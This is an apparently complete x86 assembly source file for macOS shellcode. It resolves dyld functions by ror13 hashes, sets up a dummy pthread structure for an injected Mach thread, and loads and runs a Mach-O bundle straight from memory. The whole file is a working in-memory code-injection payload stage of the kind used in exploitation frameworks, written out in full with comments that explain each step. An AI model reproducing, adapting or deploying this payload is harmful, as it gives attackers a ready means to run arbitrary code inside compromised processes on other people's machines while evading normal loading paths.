;; Original author: ddz@theta44.org
;; pthread_set_self added by redpig@dataspill.org
BITS 32
jmp _setup_self
;;; --------------------------------------------------------------------
;;; Constants
;;; --------------------------------------------------------------------
%define	MAP_ANON    0x1000
%define MAP_PRIVATE 0x0002
%define PROT_READ   0x01
%define PROT_WRITE  0x02

%define NSLINKMODULE_OPTION_BINDNOW 0x1
%define NSLINKMODULE_OPTION_PRIVATE 0x2
%define NSLINKMODULE_OPTION_RETURN_ON_ERROR 0x4

;;; --------------------------------------------------------------------
;;; ror13_hash(string symbol_name)
;;;
;;; Compute the 32-bit "ror13" hash for a given symbol name.  The hash
;;; value is left in the variable hash
;;; --------------------------------------------------------------------
%macro ror13_hash 1
  %assign hash 0
  %assign c 0
  %strlen len %1
 
  %assign i 1
  %rep len
    %substr c %1 i
    %assign hash ((((hash >> 13) | (hash << 19)) + c) & 0xFFFFFFFF)
    %assign i i + 1
  %endrep
%endmacro

;;; --------------------------------------------------------------------
;;; dyld_resolve(uint32_t hash)
;;;
;;; Lookup the address of an exported symbol within dyld by "ror13" hash.
;;; 
;;; Arguments:
;;;     hash - 32-bit "ror13" hash of symbol name
;;; --------------------------------------------------------------------
_dyld_resolve:
	mov	eax, [esp+4]
	push	eax
	push	0x8fe00000
	call	_macho_resolve
	ret	4

;;; --------------------------------------------------------------------
;;; macho_resolve(void* base, uint32_t hash)
;;;
;;; Lookup the address of an exported symbol within the given Mach-O
;;; image by "ror13" hash value.
;;; 
;;; Arguments:
;;;     base - base address of Mach-O image
;;;     hash - 32-bit "ror13" hash of symbol name
;;; --------------------------------------------------------------------
_macho_resolve:
	push	ebp
	mov	ebp, esp
	sub	esp, byte 12
	push	ebx
	push	esi
	push	edi

	mov	ebx, [ebp+8]		; mach-o image base address
	mov	eax, [ebx+16]		; mach_header->ncmds
	mov	[ebp-4], eax		; ncmds
	
	add	bl, 28			; Advance ebx to first load command
.loadcmd:
	;; Load command loop
	xor	eax, eax
	cmp	dword [ebp-4], eax
	je	.return

	inc	eax
	cmp	[ebx], eax
	je	.segment
	inc	eax
	cmp	[ebx], eax
	je	.symtab
.next_loadcmd:	
	;; Advance to the next load command
	dec	dword [ebp-4]
	add	ebx, [ebx+4]
	jmp	.loadcmd

.segment:
	;; Look for "__TEXT" segment
	cmp	[ebx+10], dword 'TEXT'
	je	.text
	;; Look for "__LINKEDIT" segment
	cmp	[ebx+10], dword 'LINK'
	je	.linkedit
	
	jmp	.next_loadcmd
.text:
	mov	eax, [ebx+24]
	mov	[ebp-8], eax		; save image preferred load address
	jmp	.next_loadcmd
.linkedit:
	;; We have found the __LINKEDIT segment
	mov	eax, [ebx+24]		; segcmd->vmaddr
	sub	eax, [ebp-8]		; image preferred load address
	add	eax, [ebp+8]		; actual image load address
	sub	eax, [ebx+32]		; segcmd->fileoff
	mov	[ebp-12], eax		; save linkedit segment base

	jmp	.next_loadcmd

.symtab:
	;; Examine LC_SYMTAB load command
	mov	ecx, [ebx+12]		; ecx = symtab->nsyms
.symbol:
	xor	eax, eax
	cmp	ecx, eax
	je	.return
	dec	ecx
	
	imul	edx, ecx, byte 12	; edx = index into symbol table
	add	edx, [ebx+8]		; edx += symtab->symoff
	add	edx, [ebp-12]		; adjust symoff relative to linkedit

	mov	esi, [edx]		; esi = index into string table
	add	esi, [ebx+16]		; esi += symtab->stroff
	add	esi, [ebp-12]		; adjust stroff relative to linkedit

	;; hash = (hash >> 13) | ((hash & 0x1fff) << 19) + c
	xor	edi, edi
	cld
.hash:
	xor	eax, eax
	lodsb
	cmp	al, ah
        je      .compare
        ror     edi, 13
        add     edi, eax
        jmp     .hash

.compare:
	cmp	edi, [ebp+12]
	jne	.symbol

	mov	eax, [edx+8]		; return symbols[ecx].n_value
	sub	eax, [ebp-8]		; adjust to actual load address
	add	eax, [ebp+8]
.return:	
	pop	edi
	pop	esi
	pop	ebx
	leave
	ret	8

;;; --------------------------------------------------------------------
;;; inject_bundle(int filedes)
;;; 
;;; Read a Mach-O bundle from the given file descriptor, load and link
;;; it into the currently running process.
;;; 
;;; Arguments:
;;;     bundle_addr (edi) - address where the bundle is loaded
;;;     bundle_size (esi) - size of the bundle
;;; --------------------------------------------------------------------
_inject_bundle:
	push	ebp
	mov	ebp, esp
	sub	esp, byte 12

	;; Now that we are calling library methods, we need to make sure
	;; that esp is 16-byte aligned at the the point of the call
	;; instruction.  So we align the stack here and then just be
	;; careful to keep it aligned as we call library functions.

	sub	esp, byte 16
	and	esp, 0xfffffff0
	
	;; load bundle from mmap'd buffer
	push	byte 0		; maintain alignment
	lea	eax, [ebp-8]
	push	eax		; &objectFileImage
	push	esi		; size
	push	edi		; addr
	ror13_hash "_NSCreateObjectFileImageFromMemory"
	push	dword hash
	call	_dyld_resolve
	call	eax
	cmp	al, 1
	jne	.error

	;; link bundle from object file image
	xor	eax, eax
	push	eax
	mov	al, (NSLINKMODULE_OPTION_RETURN_ON_ERROR | NSLINKMODULE_OPTION_BINDNOW)
	push	eax
	push	esp		; ""
	push	dword [ebp-8]
	ror13_hash "_NSLinkModule"
	push	dword hash
	call	_dyld_resolve
	call	eax

	;; run_symbol = NSLookupSymbolInModule(module, "_run")
	mov	ebx, eax
	xor	eax, eax
	push	eax		; "\0\0\0\0"
	push	0x6e75725f	; "_run"
	mov	eax, esp
	push	eax		; sym
	push	ebx		; module

	ror13_hash "_NSLookupSymbolInModule"
	push	dword hash
	call	_dyld_resolve
	call	eax

	;; NSAddressOfSymbol(run_symbol)
	sub	esp, 12		; maintain alignment
	push	eax
	ror13_hash "_NSAddressOfSymbol"
	push    dword hash
	call    _dyld_resolve
	call    eax

	;; _run(void)
	sub	esp, 8		; maintain alignment (was 12)
	push	esi
	push	edi
	call	eax

.error:
	;; Exit cleanly
	xor	eax, eax
	push	eax	; EXIT_SUCCESS
	push	eax	; spacer
	mov	al, 1
	int	0x80

;;;
;;; Since we are being injected into a new mach thread, we need to
;;; set up a dummy thread structure to keep
;;; _NSCreateObjectFileImageFromMemoryfrom crashing.  We will assume
;;; we have some space before the stack and use it for it for that purpose.
;;;
_setup_self:
;; Make sure we are 16-byte aligned
	sub	esp, byte 16
	and	esp, 0xfffffff0
;; Look up and call private pthread_set_self
	ror13_hash "__pthread_set_self"
	push	dword hash
	call	_dyld_resolve
	mov ebx, esp
;; Use some of the space before the stack.  We know it's there.
	sub ebx, 32
	push ebx
	call	eax
;; We're ready to do some work.
	jmp _inject_bundle


